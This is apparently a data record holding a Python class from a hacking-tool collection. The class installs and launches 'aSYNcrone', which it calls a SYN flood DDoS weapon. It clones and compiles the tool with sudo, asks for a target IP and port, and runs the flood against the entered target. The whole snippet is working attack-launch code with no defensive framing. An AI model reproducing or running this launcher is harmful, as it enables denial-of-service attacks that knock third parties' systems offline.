@@ -1,0 +1,7 @@
+{
+    "code": "class Asyncrone(HackingTool):\n    TITLE = \"Asyncrone | Multifunction SYN Flood DDoS Weapon\"\n    DESCRIPTION = (\n        \"aSYNcrone is a C language based, mulltifunction SYN Flood \"\n        \"DDoS Weapon.\\nDisable the destination system by sending a \"\n        \"SYN packet intensively to the destination.\"\n    )\n    INSTALL_COMMANDS = [\n        \"git clone https://github.com/fatih4842/aSYNcrone.git\",\n        \"cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread\",\n    ]\n    PROJECT_URL = \"https://github.com/fatihsnsy/aSYNcrone\"\n\n    def run(self):\n        console.print(Panel(Text(self.TITLE, justify=\"center\"), style=f\"bold {P_COLOR}\"))\n        source_port = Prompt.ask(\"Enter Source Port >>\")\n        target_ip = Prompt.ask(\"Enter Target IP >>\")\n        target_port = Prompt.ask(\"Enter Target port >>\")\n        os.system(\"cd aSYNcrone;\")\n        subprocess.run(\n            [\"sudo\", \"./aSYNcrone\", source_port, target_ip, target_port, 1000]\n        )",
+    "source": "github_repo:Z4nzu/hackingtool",
+    "file": "tools/ddos.py",
+    "license": "MIT",
+    "language": "python"
+}
